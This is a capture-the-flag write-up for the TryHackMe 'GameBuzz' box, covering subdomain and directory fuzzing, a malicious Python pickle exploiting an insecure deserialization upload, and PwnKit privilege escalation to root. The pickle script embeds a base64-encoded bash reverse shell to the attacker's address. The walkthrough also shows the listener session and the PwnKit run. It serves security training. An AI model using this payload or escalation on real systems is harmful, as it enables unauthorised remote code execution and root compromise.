---
title: "GameBuzz"
type: docs
tags:
  - thm
  - linux
  - hard
  - vhost
  - python-pickle
  - deserialization
  - pwnkit
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux (Ubuntu), **Difficulty:** Hard, **IP:** 10.10.138.18 (`incognito` / `gamebuzz.thm`)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. vhost enum → `wordpress.gamebuzz.thm`, `dev.incognito.com`. `dev.incognito.com/secret/` (found via feroxbuster) exposes `/secret/upload/`.
2. The upload endpoint accepts a **Python pickle (`.pkl`)** file (an ML model, "tuple of two numpy arrays"). Craft a malicious pickle with a `__reduce__` payload → **deserialization RCE** on load → shell as `www-data`.
3. Root: old polkit → **PwnKit (CVE-2021-4034)** → root.

</div>

---

## Full Walkthrough

### Nmap scan

```bash
Nmap scan report for gamebuzz.thm (10.10.138.18)
Host is up, received user-set (0.15s latency).
Scanned at 2024-04-12 21:18:43 EDT for 42s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT      STATE    SERVICE REASON      VERSION
80/tcp    open     http    syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito
54045/tcp filtered unknown no-response
```

I used burp to find some content and I found an interesting request.

```bash
GET /?Name=EUjaEgcH&Email=gkNmGzJJ%40burpcollaborator.net&Email=ZrQHwWgt%40burpcollaborator.net&Message=987754 HTTP/1.1
Host: wordpress.gamebuzz.thm
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://wordpress.gamebuzz.thm/?Name=uZVxEinX&Email=JSTTYixC%40burpcollaborator.net&Email=vChXPRMv%40burpcollaborator.net&Message=817580
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

and this is the response.

```bash
HTTP/1.1 200 OK
Date: Sat, 13 Apr 2024 01:30:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 20637

<!DOCTYPE html>
<html lang="en">

<head>
    <!-- basic -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- mobile metas -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
    <!-- site metas -->
    <title>Incognito</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- bootstrap css -->
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/dropdown.css">
    <!-- style css -->
    <link rel="stylesheet" href="/static/css/style.css">
    <!-- Responsive-->
    <link rel="stylesheet" href="/static/css/responsive.css">
    <!-- fevicon -->
    <link rel="icon" href="/static/images/fevicon.png" type="image/gif" />
    <!-- Scrollbar Custom CSS -->
    <link rel="stylesheet" href="/static/css/jquery.mCustomScrollbar.min.css">
    <!-- Tweaks for older IEs-->
    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
</head>
<!-- body -->

<body class="main-layout">
    <!-- loader  -->
    
        <img src="/static/images/loading.gif" alt="#" />
    
    <!-- end loader -->
    <!-- header -->
    <header>
        <!-- header inner -->
        
            
                
                    
                        
                            
                                
                                    
                                        <a href="index.html"><img src="/static/images/logo.png" alt="#" /></a>
                                    
                                
                            
                        
                        
                            
                                        <ul class="top_icon">
                                            <li class="button_login"> <a href="#">Login</a> </li>
                                            <li> <a href="#about">Signup</a> </li>
                                            <li class="mean-last">
                                             <a href="#"><img src="/static/images/search_icon.png" alt="#" /></a>
                                            </li>
                                        </ul>
                        
                    
                
            
            <!-- end header inner -->

            <!-- end header -->
            <section class="slider_section">
                

                    
                        
                            
                                
                                
                                    <nav class="main-menu">
                                        <ul class="menu-area-main">
                                            <li class="active"> <a href="#game">Game</a> </li>
                                            <li> <a href="#software">Software</a> </li>
                                            <li> <a href="#about">About</a> </li>
                                            <li> <a href="#testimonial">Testimonial</a> </li>
                                            <li> <a href="#contact">Contact</a> </li>
                                           
                                        </ul>
                                    </nav>
                                
                            
                            
                            
                                
                                    <h1>amazing 3d game</h1>
                                    Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
                                    <a href="#">download</a>
                                
                            
                             
                                
                                   <figure><img src="/static/images/img.png" alt="#"/></figure>
                                
                            


                        
                    
                
        
           </section>
        
    </header>
    <!-- our -->
     
  <button onclick="myFunction()" class="dropbtn">Game Ratings</button>
  
    <button onclick="sendRequest('1')">Game 1</button>
    <button onclick="sendRequest('2')">Game 2</button>
    <button onclick="sendRequest('3')">Game 3</button>
  
 

Ratings given by me

    
        
            
                
                    
                        <h2>Our Games</h2>
                    
                
            
            
                
                    

                        
                            
                                <figure><img src="/static/images/our-image1.jpg" alt="#" /></figure>
                            
                        

                        

                            
                                <h3>Angry Birds</h3>
                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et 
                                <a href="#">Free Download</a>
                            
                        
                    
                
                
                    

                        
                            
                                <figure><img src="/static/images/our-image2.jpg" alt="#" /></figure>
                            
                        

                        

                            
                                <h3>Sanke</h3>
                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et 
                                <a href="#">Free Download</a>
                            
                        
                    
                
                
                    

                        
                            
                                <figure><img src="/static/images/our-image3.jpg" alt="#" /></figure>
                            
                        

                        

                            
                                <h3>Cricket</h3>
                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et 
                                <a href="#">Free Download</a>
                            
                        
                    
                
            
        
    
   
    <!-- end our -->
    <!-- We are -->
    
        
            
                
                    
                        <h2>Software</h2>
                    
                
            
        
        
            
                 
                     
                         
                             <figure><img src="/static/images/soft.jpg"></figure>
                         
                     
                 
                 
                     
                         Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborumLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat
                         <a href="#">Read more</a>
                     
                  
            
        
    
    <!-- end We are -->

    <!-- about  -->
    
        
            
                
                    
                        <h2>About Our Game</h2>
                    
                
            
            
                
                    
                        <figure><img src="/static/images/about.jpg" alt="#" /></figure>

                         consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
                             labore et dolore magna aliqua. Ut enim conseq
                    
                
            

        
    
    <!-- end abouts -->

    <!-- testimonial -->
    
        
            
                
                    
                        <h2>Testimonial</h2>
                    
                
            
            
                
                    
                        
                            
                                <figure><img src="/static/images/test1.png" alt="#" /></figure>
                            
                        
                        
                            
                                <figure><img src="/static/images/test2.png" alt="#" /></figure>
                            
                        
                        
                            
                                <figure><img src="/static/images/test3.png" alt="#" /></figure>
                            
                        
                    
                    
                        <h3>Jecoo</h3>
                        adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna
                            aliqua. Ut enim ad minim veniam, quis
                            nostrud exercitation ullamco

                    
                
            

        
    

    <!-- end testimonial -->

    <!-- contact -->
    
        

            

                

                    <form class="contact_bg">
                        
                            
                                <input class="contactus" placeholder="Name" type="text" name="Name">
                            
                            
                                <input class="contactus" placeholder="Phone" type="text" name="Email">
                            
                            
                                <input class="contactus" placeholder="Email" type="text" name="Email">
                            
                            
                                <textarea class="textarea" placeholder="Message" type="text" name="Message"></textarea>
                            
                            
                                <button class="send">Send</button>
                            
                        
                    </form>
                
            

        
    
   
    <!-- end contact -->

    <!--  footer -->
    <footr>
        
            
                
                    
                        <h2>Newsletter</h2>
                    
                    
                        <form class="news">
                            <input class="newslatter" placeholder="Enter Your Email" type="text" name="Enter Your Email">
                            <button class="submit">Subscribe</button>
                        </form>
                    
                    
                        
                            
                                
                                    <ul class="social_link">
                                        <li><a href="#"><img src="/static/icon/fb.png"></a></li>
                                        <li><a href="#"><img src="/static/icon/tw.png"></a></li>
                                        <li><a href="#"><img src="/static/icon/lin%282%29.png"></a></li>
                                         <li><a href="#"><img src="/static/icon/instagram.png"></a></li>
                                    </ul>
                                    <a href="index.html"> <img src="/static/images/logo.png" alt="logo"></a>
                                
                            
                            
                                
                                    <h3>Quick links</h3>
                                    <ul class="Menu_footer">
                                        <li class="active"> <img src="/static/images/3.png" alt="#"> <a href="#game">Game</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#software">Software</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#about">About</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#testimonial"> Testimonial</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#contact">Contact</a> </li>
                                    </ul>
                                
                            
                            
                                
                                    <h3>Downloaded</h3>
                                    <ul class="Links_footer">
                                        <li class="active"><img src="/static/images/3.png" alt="#"> <a href="#">Lorem Ipsum </a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#">Simply random</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#">Roots in a</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#"> Piece</a> </li>
                                        <li><img src="/static/images/3.png" alt="#"> <a href="#">Classical</a> </li>
                                    </ul>
                                
                            

                            
                                
                                    <h3>Contact us </h3>
                                    <ul class="loca">
                                        <li>
                                            <a href="#"><img src="/static/icon/loc.png" alt="#" /></a>London 145
                                            United Kingdom </li>
                                        <li>
                                            <a href="#"><img src="/static/icon/email.png" alt="#" /></a>admin@incognito.com</li>
                                        <li>
                                            <a href="#"><img src="/static/icon/call.png" alt="#" /></a>+12586954775 </li>
                                    </ul>
                                
                            
                        
                    

                

            
            
                
                    © 2019 All Rights Reserved. <a href="https://html.design/">Free html Templates</a>
                
            
        
    </footr>
    <!-- end footer -->
    <!-- Javascript files-->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.bundle.min.js"></script>
    <script src="/static/js/jquery-3.0.0.min.js"></script>
    <script src="/static/js/plugin.js"></script>
    <!-- sidebar -->
    <script src="/static/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="/static/js/custom.js"></script>
    <script src="/static/js/dropdown.js"></script>
    <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>

</body>

</html>
```

From the way this includes `<button onclick="sendRequest('1')">Game 1</button>` almost makes it seem like there is `XSS` so I take a look and crawl it a bit more.

```bash
┌─[abadd0n@EX3CP01S0N] - [~/XSStrike] - [Fri Apr 12, 21:31]
└─[$]> python3 xsstrike.py -u 'http://wordpress.gamebuzz.thm/' -l 5 -t 10  --crawl --blind  

	XSStrike v3.1.5

[~] Crawling the target 
[!!] Unable to connect to the target.               
------------------------------------------------------------
[+] Vulnerable component: jquery v3.3.0 
[!] Component location: http://wordpress.gamebuzz.thm/static/js/jquery.min.js 
[!] Total vulnerabilities: 1 
[!] Summary: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution 
[!] Severity: low 
[!] CVE: CVE-2019-11358 
------------------------------------------------------------
------------------------------------------------------------
[+] Vulnerable component: bootstrap v4.1.0 
[!] Component location: http://wordpress.gamebuzz.thm/static/js/bootstrap.bundle.min.js 
[!] Total vulnerabilities: 4 
[!] Summary: XSS in data-template, data-content and data-title properties of tooltip/popover 
[!] Severity: high 
[!] CVE: CVE-2019-8331 
[!] Summary: XSS in collapse data-parent attribute 
[!] Severity: medium 
[!] CVE: CVE-2018-14040 
[!] Summary: XSS in data-container property of tooltip 
[!] Severity: medium 
[!] CVE: CVE-2018-14042 
[!] Summary: XSS in data-target property of scrollspy 
[!] Severity: medium 
[!] CVE: CVE-2018-14041 
------------------------------------------------------------
[!!] Unable to connect to the target. 
 !] Progress: 2/2.html  
```

I find a few things which can possibly help me in this situation. It seems that there is some technologies and `js` libs that are used here that are used on other technologies and `CMS` such as `drupal` and etc. From here I am going to use `nuclei` to identify them more indepth as well as some other things within this web application.

I was able to find a subdomain by the email that was on the website `incognito.com`
I then used `ffuf` to find the subdomain `dev`.

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/GameBuzz] - [Fri Apr 12, 22:12]
└─[$]> ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c -u http://incognito.com/  -H "Host: FUZZ.incognito.com" --mc all --fw 8853

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://incognito.com/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.incognito.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 8853
________________________________________________

dev                     [Status: 200, Size: 57, Words: 5, Lines: 2]
```

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/GameBuzz] - [Fri Apr 12, 22:13]
└─[$]> feroxbuster -u http://dev.incognito.com/secret/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 64 -x html,php,php5,sh,bin,py,war,aspx,dox,lst,sqlite,txt,js,java,jar,htm -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.incognito.com/secret/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, php5, sh, bin, py, war, aspx, dox, lst, sqlite, txt, js, java, jar, htm]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      279c http://dev.incognito.com/secret/secret
404      GET        9l       31w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      330c http://dev.incognito.com/secret/upload => http://dev.incognito.com/secret/upload/
[>-------------------] - 3m     14607/7498615 27h     found:2       errors:4789   
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_dev_incognito_com_secret_-1712974685.state ...
[>-------------------] - 3m     14614/7498615 27h     found:2       errors:4791   
[>-------------------] - 3m     50473/3749282 261/s   http://dev.incognito.com/secret/ 
[>-------------------] - 3m     30209/3749282 200/s   http://dev.incognito.com/secret/upload
```

After fuzzing with `feroxbuster` I was able to find the endpoint `http://dev.incognito.com/secret/upload/`. Which allows us to upload files. What my assumtion is that looking at the following requests we can upload a `.pkl` file which is a **Python pickle file serializes a tuple of two numpy arrays**. So we can possible generate a payload with `pickle` to get a shell like here.

```bash
POST /fetch HTTP/1.1
Host: wordpress.gamebuzz.thm
Origin: http://wordpress.gamebuzz.thm
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://wordpress.gamebuzz.thm/
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 42

{"object":"/var/upload/games/object2.pkl"}
```

```bash
HTTP/1.1 200 OK
Date: Sat, 13 Apr 2024 01:23:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 51

{"Game": "Valorant", "Rating": 7, "Review": "Okay"}
```

I then used this [resource](https://frichetten.com/blog/escalating-deserialization-attacks-python/) to help generate the payload.

```python
#!/usr/bin/env python3

import pickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjU5Ljk3LzkwMDEgMD4mMQ==' | base64 -d | bash",))

pickle.dump(SerializedPickle(), open('baphomet','wb'))
```

I was able to generate this payload then afterwards upload and call it using the same method it was calling the other `.pkl` files.

```bash
POST /fetch HTTP/1.1
Host: wordpress.gamebuzz.thm
Origin: http://wordpress.gamebuzz.thm
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://wordpress.gamebuzz.thm/
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 42

{"object":"/var/upload/payload"}
```

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/GameBuzz] - [Fri Apr 12, 22:18]
└─[$]> nc -lnvvp 9001           
Listening on 0.0.0.0 9001
Connection received on 10.10.138.18 56850
bash: cannot set terminal process group (926): Inappropriate ioctl for device
bash: no job control in this shell
www-data@incognito:/$ 
```

Used the pwnkit exploit to privesc

```bash
┌─[abadd0n@EX3CP01S0N] - [~] - [Fri Apr 12, 23:46]
└─[$]> pwncat-cs -l -p 9001
[23:46:53] Welcome to pwncat 🐈!                                                                                                                             __main__.py:164
[23:46:59] received connection from 10.10.138.18:57010                                                                                                            bind.py:84
[23:47:09] 10.10.138.18:57010: registered new host w/ db                                                                                                      manager.py:957
(local) pwncat$ pwd
[23:47:20] error: pwd: unknown command                                                                                                                        manager.py:957
(local) pwncat$                                                                                                                                                             
(remote) www-data@incognito:/$ cd tmp/
(remote) www-data@incognito:/tmp$ 
(local) pwncat$ upload /home/abadd0n/personal/toolkit/PwnKit
./PwnKit ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 14.7/14.7 KB • ? • 0:00:00
[23:47:52] uploaded 14.69KiB in 1.66 seconds                                                                                                                    upload.py:76
(local) pwncat$                                                                                                                                                             
(remote) www-data@incognito:/tmp$ ls
PwnKit	linpeas.sh  pspy64  tmux-1000  tmux-33
(remote) www-data@incognito:/tmp$ chmod +x PwnKit 
(remote) www-data@incognito:/tmp$ ./PwnKit 
root@incognito:/tmp# cd /root
root@incognito:~# ls
root.txt
root@incognito:~# 
```
